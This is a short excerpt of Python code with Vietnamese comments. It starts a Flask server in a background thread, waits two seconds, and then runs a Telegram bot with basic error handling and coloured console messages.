    logging.getLogger('urllib3').setLevel(logging.WARNING)
    
    # Khởi chạy Flask trong thread riêng
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    # Đợi một chút để Flask khởi động
    time.sleep(2)
    
    # Khởi chạy Telegram bot
    try:
        run_telegram_bot()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}👋 Bot stopped by user{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}❌ Fatal error: {e}{Fore.RESET}")
        sys.exit(1)
